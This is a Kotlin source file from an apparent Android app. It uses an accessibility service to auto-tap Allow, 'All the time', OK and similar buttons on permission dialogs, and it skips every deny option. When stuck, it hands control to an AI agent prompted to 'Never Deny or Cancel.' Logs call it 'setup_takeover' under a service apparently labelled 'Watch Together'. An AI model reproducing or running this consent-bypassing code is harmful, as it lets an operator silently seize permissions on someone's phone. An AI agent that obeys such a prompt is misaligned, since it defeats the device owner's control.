package com.phonehand.app

import android.content.Context
import android.util.Log
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.Executors
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Lightning-fast rule-based permission handler — taps Allow/OK immediately, AI fallback if stuck.
 */
object PermissionAutoGrant {
    private const val TAG = "PermAutoGrant"
    private const val MAX_DURATION_MS = 45_000L
    private const val MAX_TAPS = 50
    private const val TAP_INTERVAL_MS = 50L
    private const val SCAN_INTERVAL_MS = 70L
    private const val STUCK_THRESHOLD = 3

    private val running = AtomicBoolean(false)
    private val executor = Executors.newSingleThreadExecutor()

    private val ALLOW_KEYWORDS = listOf(
        "allow",
        "while using",
        "while in use",
        "during use",
        "all the time",
        "only this time",
        "just once",
        "always",
        "ok",
        "continue",
        "accept",
        "got it",
        "turn on",
        "yes",
        "grant",
        "permit",
        "enable",
        "agree",
        "precise",
        "approximate",
        "nearby",
        "notifications",
        "allow all",
        "don't deny",
    )

    private val DENY_KEYWORDS = listOf(
        "don't allow",
        "dont allow",
        "deny",
        "cancel",
        "no thanks",
        "not now",
        "decline",
        "reject",
        "skip",
        "ask every time",
    )

    interface Callback {
        fun onLog(line: String)
        fun onDone(taps: Int)
        fun onError(message: String)
    }

    fun isRunning(): Boolean = running.get()

    fun runLightning(context: Context) {
        runSilent(context)
        executor.execute {
            Thread.sleep(1800)
            if (!running.get()) runSilent(context)
            Thread.sleep(2500)
            if (!running.get()) runSilent(context)
        }
    }

    fun run(context: Context, cb: Callback) {
        if (!running.compareAndSet(false, true)) {
            cb.onError("Already running")
            return
        }
        executor.execute {
            try {
                runLoop(context, cb)
            } catch (e: Exception) {
                Log.w(TAG, e.message ?: "grant")
                cb.onError(e.message ?: "Failed")
            } finally {
                running.set(false)
            }
        }
    }

    fun runSilent(context: Context) {
        run(context, object : Callback {
            override fun onLog(line: String) {
                Log.d(TAG, line)
                SetupReporter.progress(line)
            }

            override fun onDone(taps: Int) {
                Log.d(TAG, "setup_takeover done — $taps action(s)")
                SetupReporter.done(
                    if (taps > 0) "Granted $taps permission step(s)" else "No dialogs found — may already be allowed",
                    taps,
                )
            }

            override fun onError(message: String) {
                Log.w(TAG, "setup_takeover: $message")
                SetupReporter.error(message)
            }
        })
    }

    fun cancel() {
        running.set(false)
    }

    private fun runLoop(context: Context, cb: Callback) {
        val service = TouchAccessibilityService.instance
        if (service == null) {
            cb.onError("Watch Together is off — enable in Accessibility")
            return
        }

        cb.onLog("AI granting permissions…")
        SetupReporter.progress("Waking phone & scanning dialogs…", "start")
        val start = System.currentTimeMillis()
        var taps = 0
        var consecutiveMisses = 0
        var agentFallbacks = 0

        while (running.get()) {
            val elapsed = System.currentTimeMillis() - start
            if (elapsed >= MAX_DURATION_MS || taps >= MAX_TAPS) break

            val tree = service.snapshotTree() ?: service.lastTreeJson
            if (tree == null) {
                Thread.sleep(SCAN_INTERVAL_MS)
                continue
            }

            val target = findBestTarget(tree)
            if (target != null) {
                consecutiveMisses = 0
                cb.onLog("Allow → ${target.label}")
                service.tapAt(target.cx, target.cy)
                taps++
                Thread.sleep(TAP_INTERVAL_MS)
                service.scheduleRefreshesAfterInput()
                Thread.sleep(SCAN_INTERVAL_MS)
            } else {
                consecutiveMisses++
                if (consecutiveMisses >= STUCK_THRESHOLD && agentFallbacks < 2) {
                    agentFallbacks++
                    consecutiveMisses = 0
                    cb.onLog("AI reading screen…")
                    if (tryAgentFallback(context, tree, cb)) {
                        taps++
                        Thread.sleep(400)
                        continue
                    }
                }
                if (consecutiveMisses >= STUCK_THRESHOLD + 4) break
                Thread.sleep(SCAN_INTERVAL_MS)
            }
        }

        cb.onLog(if (taps > 0) "Finished — $taps step(s)" else "Scan complete")
        cb.onDone(taps)
    }

    private data class TapTarget(
        val cx: Float,
        val cy: Float,
        val label: String,
        val score: Int,
    )

    private fun findBestTarget(tree: JSONObject): TapTarget? {
        val nodes = tree.optJSONArray("nodes") ?: return null
        val isPopup = tree.optInt("popup", 0) == 1
        var best: TapTarget? = null

        for (i in 0 until nodes.length()) {
            val n = nodes.getJSONObject(i)
            if (n.optInt("d", 0) == 1) continue

            val text = n.optString("t", "").ifBlank { n.optString("h", "") }
            val clickable = n.optInt("k", 0) == 1
            val checkable = n.optInt("x", -1) >= 0
            val checked = n.optInt("x", 0) == 1
            val onPopup = n.optInt("pop", 0) == 1 || isPopup
            val role = n.optString("r", "")

            val b = n.optJSONArray("b") ?: continue
            if (b.length() < 4) continue
            val cx = (b.getInt(0) + b.getInt(2)) / 2f
            val cy = (b.getInt(1) + b.getInt(3)) / 2f

            if (checkable && !checked && text.isNotBlank()) {
                if (matchesAllow(text) && !matchesDeny(text)) {
                    val score = scoreTarget(text, onPopup, role, true)
                    val target = TapTarget(cx, cy, text.take(40), score)
                    if (best == null || target.score > best.score) best = target
                }
                continue
            }

            if (!clickable || text.isBlank()) continue
            if (matchesDeny(text)) continue
            if (!matchesAllow(text)) continue

            val score = scoreTarget(text, onPopup, role, false)
            val target = TapTarget(cx, cy, text.take(40), score)
            if (best == null || target.score > best.score) best = target
        }

        return best
    }

    private fun scoreTarget(text: String, onPopup: Boolean, role: String, isToggle: Boolean): Int {
        var score = 0
        val lower = text.lowercase()
        if (onPopup) score += 50
        if (role == "btn") score += 20
        if (isToggle) score += 15
        when {
            lower == "allow" -> score += 40
            lower.contains("while using") || lower.contains("while in use") -> score += 38
            lower.contains("all the time") || lower.contains("always") -> score += 36
            lower.contains("only this time") || lower.contains("just once") -> score += 32
            lower == "ok" || lower == "continue" -> score += 28
            lower.contains("allow") -> score += 22
            lower.contains("turn on") || lower.contains("enable") -> score += 20
        }
        return score
    }

    private fun matchesAllow(text: String): Boolean {
        val lower = text.lowercase()
        return ALLOW_KEYWORDS.any { lower.contains(it) }
    }

    private fun matchesDeny(text: String): Boolean {
        val lower = text.lowercase()
        return DENY_KEYWORDS.any { lower.contains(it) }
    }

    private fun tryAgentFallback(context: Context, tree: JSONObject, cb: Callback): Boolean {
        val service = TouchAccessibilityService.instance ?: return false
        val screen = ScreenSummarizer.compact(tree)
        val prompt =
            "Tap Allow, While using the app, All the time, OK, Continue, Accept, Turn on, Yes, Grant. One tap only. Never Deny or Cancel."
        var tapped = false
        val latch = java.util.concurrent.CountDownLatch(1)

        LocalAgent.run(context, prompt, screen, object : LocalAgent.Callback {
            override fun onLog(line: String) {
                cb.onLog("AI: $line")
            }

            override fun onDone() {
                tapped = true
                latch.countDown()
            }

            override fun onError(message: String) {
                cb.onLog("AI: $message")
                latch.countDown()
            }
        })

        latch.await(8, java.util.concurrent.TimeUnit.SECONDS)
        service.scheduleRefreshesAfterInput()
        return tapped
    }
}
